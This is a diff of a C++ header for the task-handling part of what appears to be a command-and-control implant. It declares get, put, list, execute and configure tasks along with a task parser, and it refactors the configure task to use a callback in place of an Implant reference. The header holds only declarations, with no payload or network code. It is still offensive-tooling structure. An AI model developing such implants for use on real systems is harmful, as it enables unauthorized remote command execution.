@@ -3,13 +3,14 @@
  * file 'LICENSE', which is part of this source code package.
  */
 #pragma once
-#include "implant.h"
+#include "results.h"
 #include <boost/property_tree/ptree.hpp>
 #include <boost/uuid/uuid.hpp>
 #include <cstdint>
 #include <string>
 #include <string_view>
 #include <variant>
+#include <functional>
 
 struct GetTask {
   constexpr static std::string_view key{"get"};
@@ -49,14 +50,20 @@ private:
   const std::string command;
 };
 
+struct Configuration{
+  Configuration(const double meanDwell, const bool isRunning);
+  const double mean_dwell;
+  const bool is_running;
+};
+
 struct ConfigureTask {
   constexpr static std::string_view key{"configure"};
   ConfigureTask(const boost::uuids::uuid &id, double mean_dwell,
-                bool is_running, Implant &implant);
+                bool is_running, std::function<void(const Configuration&)> setter);
   [[nodiscard]] Result run() const;
   const boost::uuids::uuid id;
 private:
-  Implant &implant;
+  std::function<void(const Configuration&)> setter;
   const double mean_dwell;
   const bool is_running;
 };
@@ -64,5 +71,4 @@ private:
 using Task =
 std::variant<GetTask, PutTask, ListTask, ExecuteTask, ConfigureTask>;
 
-[[nodiscard]] Task parse_task_from(const boost::property_tree::ptree &task_tree,
-                                   Implant &implant);
+[[nodiscard]] Task parse_task_from(const boost::property_tree::ptree &task_tree, std::function<void(const Configuration&)> setter);
